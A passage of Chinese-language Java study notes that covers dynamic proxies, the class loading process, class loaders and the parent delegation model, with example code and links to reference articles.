        //代理角色，现在没有p
        ProxyInvocationHangler pih = new ProxyInvocationHangler();
        //设置代理对象
        pih.setTarget(userService);
        //动态生成代理类
        UserService proxy = (UserService) pih.getProxy();
        proxy.add();
        //        proxy.delete();
        //        proxy.update();
    }
}
```



# 4、类的动态加载 
> <font style="color:rgb(33, 37, 41);">Java类加载机制和对象创建过程</font>
>
> [https://segmentfault.com/a/1190000023876273](https://segmentfault.com/a/1190000023876273)
>
> <font style="color:rgb(60, 60, 67);">类加载过程详解</font>
>
> [https://javaguide.cn/java/jvm/class-loading-process.html](https://javaguide.cn/java/jvm/class-loading-process.html)
>

### 类加载过程：
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757858.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757062.png)

+ **加载：**将类的 class 文件字节码加载到内存，并将静态数据转化为方法区的运行时数据结构，然后生成一个 java.lang.Class 对象
+ **链接：**将java类二进制数据合并到 JRE中
    - **验证：**确保加载的类信息符合JVM规范，没有安全方面的问题
    - **准备：**正式为类变量 （static） 分配内存并设置类变量默认初始值的阶段（所以说static在初始化之前就已经有了一个值），这些内存都将在方法区中进行分配
    - **解析：**虚拟机将常量池内的符号引用替换为直接引用的过程
+ **初始化：**执行初始化方法 `<clinit> ()`方法的过程，是类加载的最后一步，这一步 JVM 才开始真正执行类中定义的 Java 程序代码(字节码)。`<clinit> ()`方法会将该类的静态变量合并。

```java
package com.kuang.reflection;

public class Test05 {
    public static void main(String[] args) {
        A a = new A();
        System.out.println(A.m);
        /*
        1、加载到内存，会在堆产生一个类对应的 Class 对象
        2、链接，链接结束后 m=0
        3、初始化
            <clinit>(){
                System.out.println("A类静态代码块初始化");
                m = 300;
                m = 100;
            }
            m = 100
         */
    }
}

class A{
    static {
        System.out.println("A类静态代码块初始化");
        m = 300;
    }

    static int m = 100;

    public A() {
        System.out.println("A类的无参构造初始化");
    }
}
```



### 类加载器：
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758397.png)

```java
ppackage com.kuang.reflection;

public class Test07 {
    public static void main(String[] args) throws ClassNotFoundException {

        //获取系统类的加载器
        ClassLoader systemClassLoader=ClassLoader.getSystemClassLoader();
        System.out.println(systemClassLoader);

        //获取系统类的加载器的父类加载器->扩展类加载器
        ClassLoader parent = systemClassLoader.getParent();
        System.out.println(parent);

        //获取扩展类加载器的父类加载器-->根加载器（c/c++）
        ClassLoader parent1 = parent.getParent();
        System.out.println(parent1);

        //测试当前类是哪个类加载器加载的
        ClassLoader classLoader = Class.forName("com.kuang.reflection.Test07").getClassLoader();
        System.out.println(classLoader);

        //测试 jdk 内部的类是谁加载的
        classLoader=Class.forName("java.lang.Object").getClassLoader();
        System.out.println(classLoader);

        //获得系统类加载器可以加载的路径
        System.out.println(System.getProperty("java.class.path"));
        /*
        D:\Java\jdk1.8\jre\lib\charsets.jar;
        D:\Java\jdk1.8\jre\lib\deploy.jar;
        D:\Java\jdk1.8\jre\lib\ext\access-bridge-64.jar;
        D:\Java\jdk1.8\jre\lib\ext\cldrdata.jar;
        D:\Java\jdk1.8\jre\lib\ext\dnsns.jar;
        D:\Java\jdk1.8\jre\lib\ext\jaccess.jar;
        D:\Java\jdk1.8\jre\lib\ext\jfxrt.jar;
        D:\Java\jdk1.8\jre\lib\ext\localedata.jar;
        D:\Java\jdk1.8\jre\lib\ext\nashorn.jar;
        D:\Java\jdk1.8\jre\lib\ext\sunec.jar;
        D:\Java\jdk1.8\jre\lib\ext\sunjce_provider.jar;
        D:\Java\jdk1.8\jre\lib\ext\sunmscapi.jar;
        D:\Java\jdk1.8\jre\lib\ext\sunpkcs11.jar;
        D:\Java\jdk1.8\jre\lib\ext\zipfs.jar;
        D:\Java\jdk1.8\jre\lib\javaws.jar;
        D:\Java\jdk1.8\jre\lib\jce.jar;
        D:\Java\jdk1.8\jre\lib\jfr.jar;
        D:\Java\jdk1.8\jre\lib\jfxswt.jar;
        D:\Java\jdk1.8\jre\lib\jsse.jar;
        D:\Java\jdk1.8\jre\lib\management-agent.jar;
        D:\Java\jdk1.8\jre\lib\plugin.jar;
        D:\Java\jdk1.8\jre\lib\resources.jar;
        D:\Java\jdk1.8\jre\lib\rt.jar;
        D:\JavaCode\study_code\annotation&reflection\annotation\target\classes;
        C:\Users\SZZY\AppData\Local\Programs\IntelliJ IDEA Ultimate\lib\idea_rt.jar

         */
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758656.png)

### 双亲委派机制
参考：[https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B](https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B)

[https://www.cnblogs.com/luckforefforts/p/13642685.html](https://www.cnblogs.com/luckforefforts/p/13642685.html)



<font style="color:rgb(89, 97, 114);">如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</font>







# 参考文章

<font style="color:rgb(34, 34, 38);">java序列化与反序列化全讲解</font>

[https://blog.csdn.net/mocas_wang/article/details/107621010](https://blog.csdn.net/mocas_wang/article/details/107621010)

<font style="color:rgb(37, 41, 51);">为什么HashMap要自己实现writeObject和readObject方法？</font>

[https://juejin.cn/post/6844903954774491144](https://juejin.cn/post/6844903954774491144)

<font style="color:rgb(37, 41, 51);">谈谈Java反射：从入门到实践，再到原理</font>

[https://juejin.cn/post/6844904025607897096](https://juejin.cn/post/6844904025607897096)

<font style="color:rgb(25, 27, 31);">设计模式（四）——搞懂什么是代理模式</font>

[https://zhuanlan.zhihu.com/p/72644638](https://zhuanlan.zhihu.com/p/72644638)

<font style="color:rgb(33, 37, 41);">Java类加载机制和对象创建过程</font>

[https://segmentfault.com/a/1190000023876273](https://segmentfault.com/a/1190000023876273)

















